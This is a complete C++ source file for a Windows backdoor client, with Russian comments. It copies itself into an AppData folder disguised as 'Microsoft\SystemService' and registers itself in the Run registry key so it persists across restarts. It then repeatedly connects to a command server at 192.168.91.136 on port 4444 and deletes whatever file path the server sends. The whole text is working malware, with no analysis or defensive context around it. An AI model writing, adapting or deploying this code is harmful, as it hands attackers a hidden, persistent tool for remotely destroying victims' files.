#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <shlobj.h>   // для SHGetFolderPathA
#include <cstring>

void copyToSystem() {
    char currentPath[MAX_PATH];
    char destPath[MAX_PATH];

    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, destPath) != S_OK) {
        return;
    }

    strcat_s(destPath, "\\Microsoft\\SystemService");
    CreateDirectoryA(destPath, NULL);

    strcat_s(destPath, "\\client.exe");

    if (_stricmp(currentPath, destPath) == 0) {
        return;
    }

    CopyFileA(currentPath, destPath, FALSE);
}

void addToAutorun() {
    HKEY hKey;
    char destPath[MAX_PATH];

    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, destPath) != S_OK) {
        return;
    }
    strcat_s(destPath, "\\Microsoft\\SystemService\\client.exe");

    LONG res = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey
    );

    if (res != ERROR_SUCCESS) {
        return;
    }

    RegSetValueExA(
        hKey,
        "SystemService",      // имя записи в автозапуске
        0, REG_SZ,
        (BYTE*)destPath,
        (DWORD)(strlen(destPath) + 1)
    );

    RegCloseKey(hKey);
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    copyToSystem();
    addToAutorun();

    WSADATA wsData;
    WSAStartup(MAKEWORD(2, 2), &wsData);

    const char* SERVER_IP = "192.168.91.136";
    const int SERVER_PORT = 4444;

    while (true) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);

        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port   = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);

        if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            closesocket(sock);
            Sleep(5000);
            continue;
        }

        char filename[256] = {0};
        int bytes = recv(sock, filename, sizeof(filename) - 1, 0);
        if (bytes > 0) {
            filename[bytes] = '\0';
            DeleteFileA(filename);
        }

        closesocket(sock);
        Sleep(5000);
    }

    WSACleanup();
    return 0;
}